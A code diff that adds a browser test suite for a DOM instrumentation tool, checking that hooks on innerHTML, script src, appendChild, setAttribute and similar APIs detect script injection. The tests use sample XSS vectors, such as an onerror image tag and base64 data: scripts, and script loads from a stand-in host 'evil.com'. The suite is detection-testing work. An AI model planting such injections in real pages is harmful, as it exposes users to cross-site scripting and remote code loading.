@@ -2061,7 +2061,7 @@ const encodingHooksScript = readFileSync(join(process.cwd(), 'src/instrumentatio
       await page.addInitScript(bootstrapScript);
       await page.addInitScript(networkHooksScript);
       await page.addInitScript(storageHooksScript);
-      
+
       // Don't set up logging function - should use fallback
       await page.goto(`file://${join(process.cwd(), 'tests/fixtures/test-page.html')}`);
 
@@ -2078,6 +2078,388 @@ const encodingHooksScript = readFileSync(join(process.cwd(), 'src/instrumentatio
       });
 
       expect(result).toBe(true);
+      await page.close();
+    });
+  });
+
+  describe('Script Injection Detection', () => {
+    const domHooksScript = readFileSync('./src/instrumentation/dom-hooks.js', 'utf-8');
+
+    test('should detect innerHTML with script tag', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
+        div.innerHTML = '<script src="https://evil.com/malware.js"></script>';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'innerHTML');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].containsScriptTag).toBe(true);
+      expect(scriptInjectionEvents[0].scriptTagCount).toBe(1);
+      expect(scriptInjectionEvents[0].scriptSources).toContain('https://evil.com/malware.js');
+
+      await page.close();
+    });
+
+    test('should detect innerHTML with event handler (onerror)', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
+        div.innerHTML = '<img src="x" onerror="alert(1)">';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'innerHTML');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].containsEventHandlers).toBe(true);
+      expect(scriptInjectionEvents[0].eventHandlerTypes).toContain('onerror');
+
+      await page.close();
+    });
+
+    test('should detect createElement with script src', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const script = document.createElement('script');
+        script.src = 'https://evil.com/payload.js';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.src');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].scriptSrc).toBe('https://evil.com/payload.js');
+
+      await page.close();
+    });
+
+    test('should detect createElement with script textContent', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const script = document.createElement('script');
+        script.textContent = 'alert("Injected code");';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.textContent');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].scriptContent).toContain('alert');
+
+      await page.close();
+    });
+
+    test('should detect data: URL with base64 decoding', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const script = document.createElement('script');
+        // alert("Base64 injection");
+        script.src = 'data:text/javascript;base64,YWxlcnQoIkJhc2U2NCBpbmplY3Rpb24iKTs=';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.src');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].isDataUrl).toBe(true);
+      expect(scriptInjectionEvents[0].decodedContent).toContain('alert');
+
+      await page.close();
+    });
+
+    test('should detect blob: URL', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const script = document.createElement('script');
+        script.src = 'blob:http://example.com/12345678-1234-1234-1234-123456789012';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'script.src');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].isBlobUrl).toBe(true);
+
+      await page.close();
+    });
+
+    test('should detect appendChild with script element', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const script = document.createElement('script');
+        script.src = 'https://evil.com/appended.js';
+        document.body.appendChild(script);
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'appendChild');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].scriptSrc).toBe('https://evil.com/appended.js');
+
+      await page.close();
+    });
+
+    test('should detect insertAdjacentHTML with script', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
+        div.insertAdjacentHTML('beforeend', '<script>console.log("Adjacent")</script>');
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'insertAdjacentHTML');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].containsScriptTag).toBe(true);
+
+      await page.close();
+    });
+
+    test('should detect setAttribute with event handler', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const btn = document.createElement('button');
+        btn.setAttribute('onclick', 'evilFunction()');
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'setAttribute');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].attributeName).toBe('onclick');
+      expect(scriptInjectionEvents[0].attributeValue).toContain('evilFunction');
+
+      await page.close();
+    });
+
+    test('should detect outerHTML with script', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
+        div.outerHTML = '<div><script src="outer.js"></script></div>';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'outerHTML');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].containsScriptTag).toBe(true);
+      expect(scriptInjectionEvents[0].scriptSources).toContain('outer.js');
+
+      await page.close();
+    });
+
+    test('should detect multiple scripts in innerHTML', async () => {
+      page = await browser.newPage();
+      const events: any[] = [];
+
+      await page.exposeFunction('__test_log_event', (eventJson: string) => {
+        events.push(JSON.parse(eventJson));
+      });
+
+      await page.addInitScript(bootstrapScript);
+      await page.addInitScript(`
+        window.__js_unshroud_session_id = 'test-session';
+        window.__js_unshroud_log = function(data) {
+          window.__test_log_event(data);
+        };
+      `);
+      await page.addInitScript(domHooksScript);
+
+      await page.goto('about:blank');
+
+      await page.evaluate(() => {
+        const div = document.createElement('div');
+        document.body.appendChild(div);
+        div.innerHTML = '<script src="script1.js"></script><script src="script2.js"></script>';
+      });
+
+      await page.waitForTimeout(100);
+
+      const scriptInjectionEvents = events.filter(e => e.type === 'script_injection' && e.method === 'innerHTML');
+      expect(scriptInjectionEvents.length).toBeGreaterThan(0);
+      expect(scriptInjectionEvents[0].scriptTagCount).toBe(2);
+      expect(scriptInjectionEvents[0].scriptSources).toContain('script1.js');
+      expect(scriptInjectionEvents[0].scriptSources).toContain('script2.js');
+
       await page.close();
     });
   });
